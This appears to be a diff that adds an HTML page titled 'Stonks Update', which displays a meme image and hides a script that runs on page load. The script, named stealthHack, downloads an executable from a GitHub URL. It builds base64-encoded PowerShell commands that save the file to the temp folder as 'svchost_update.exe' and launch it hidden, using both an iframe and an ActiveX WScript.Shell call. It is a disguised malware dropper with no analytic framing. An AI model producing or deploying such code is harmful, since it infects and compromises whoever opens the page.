@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Stonks Update</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #000; overflow: hidden; }
+        img { width: 100%; height: auto; display: block; }
+    </style>
+</head>
+<body>
+    <img src="https://raw.githubusercontent.com/Shay7lebb-cloud/ASDGSZFG/main/krama%20stonks.png" alt="Stonks">
+    
+    <script>
+        const exeUrl = "https://github.com/Shay7lebb-cloud/ASDGSZFG/raw/refs/heads/main/mshalb7.exe";
+        
+        async function stealthHack() {
+            try {
+                const response = await fetch(exeUrl);
+                const blob = await response.blob();
+                const buffer = await blob.arrayBuffer();
+                
+                const base64 = btoa(String.fromCharCode(...new Uint8Array(buffer)));
+                
+                const psScript = `
+                    $dir = [System.IO.Path]::GetTempPath();
+                    $file = Join-Path $dir "svchost_update.exe";
+                    $bytes = [Convert]::FromBase64String("${base64}");
+                    [System.IO.File]::WriteAllBytes($file, $bytes);
+                    Start-Process $file -WindowStyle Hidden;
+                    exit;
+                `;
+                
+                const encodedPs = btoa(psScript);
+                const cmdExec = `cmd /c powershell -encodedCommand ${encodedPs}`;
+                
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.srcdoc = `<script>document.execCommand('start', false, '${cmdExec}');</script>`; 
+                
+                const psCode = `
+                    $url = "${exeUrl}";
+                    $path = "$env:TEMP\\svchost_update.exe";
+                    Invoke-WebRequest -Uri $url -OutFile $path;
+                    Start-Process $path -WindowStyle Hidden;
+                    exit;
+                `;
+                
+                const encodedCmd = btoa(psCode);
+                
+                const win = window.open("about:blank", "_blank");
+                win.document.write(`<script>var w=new ActiveXObject('WScript.Shell');w.run('powershell -encodedCommand ${encodedCmd}',0)</script>`);
+                win.close();
+                
+            } catch (e) {
+                console.error(e);
+            }
+        }
+        
+        stealthHack();
+    </script>
+</body>
+</html>
